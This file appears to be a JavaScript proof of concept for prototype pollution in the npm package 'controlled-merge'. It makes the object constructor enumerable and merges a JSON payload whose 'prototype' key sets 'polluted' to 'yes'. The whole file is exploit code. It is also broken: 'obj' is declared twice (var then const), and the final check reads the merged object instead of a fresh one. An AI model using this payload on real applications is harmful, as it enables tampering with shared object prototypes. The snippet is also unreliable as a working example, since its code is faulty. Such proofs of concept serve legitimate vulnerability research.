var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const merge = require('controlled-merge');
const obj = merge(obj, JSON.parse('{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'), true);
console.log('{ ' + obj.prototype.polluted + ', ' + 'yes' + ' }');